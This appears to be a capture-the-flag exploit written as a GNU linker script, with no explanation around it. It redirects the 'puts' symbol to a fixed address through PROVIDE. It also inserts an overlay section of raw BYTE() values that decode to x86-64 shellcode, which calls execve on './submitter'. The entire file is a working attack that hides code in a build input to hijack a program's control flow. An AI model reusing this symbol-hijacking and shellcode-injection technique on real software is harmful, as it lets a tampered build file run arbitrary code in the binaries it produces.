floating_point = 275;
SECTIONS
{
  .text : {
        *(.text)
        PROVIDE(puts = floating_point);
    } 
  . = . + 0x1000;
  .rodata : { *(.text) }
  . = . + 0x1000;
  .bss : { *(.bss) }
}
SECTIONS
{
  OVERLAY :
  {
    .my_section {
BYTE(0x6a);
BYTE(0x68);
BYTE(0x48);
BYTE(0xc7);
BYTE(0xc0);
BYTE(0x74);
BYTE(0x65);
BYTE(0x72);
BYTE(0x0);
BYTE(0x50);
BYTE(0x48);
BYTE(0xb8);
BYTE(0x2e);
BYTE(0x2f);
BYTE(0x73);
BYTE(0x75);
BYTE(0x62);
BYTE(0x6d);
BYTE(0x69);
BYTE(0x74);
BYTE(0x50);
BYTE(0x48);
BYTE(0x89);
BYTE(0xe7);
BYTE(0x31);
BYTE(0xf6);
BYTE(0x56);
BYTE(0x6a);
BYTE(0x8);
BYTE(0x5e);
BYTE(0x48);
BYTE(0x1);
BYTE(0xe6);
BYTE(0x56);
BYTE(0x48);
BYTE(0x89);
BYTE(0xe6);
BYTE(0x31);
BYTE(0xd2);
BYTE(0x6a);
BYTE(0x3b);
BYTE(0x58);
BYTE(0xf);
BYTE(0x5);
    }
  }
}
INSERT AFTER .bss;
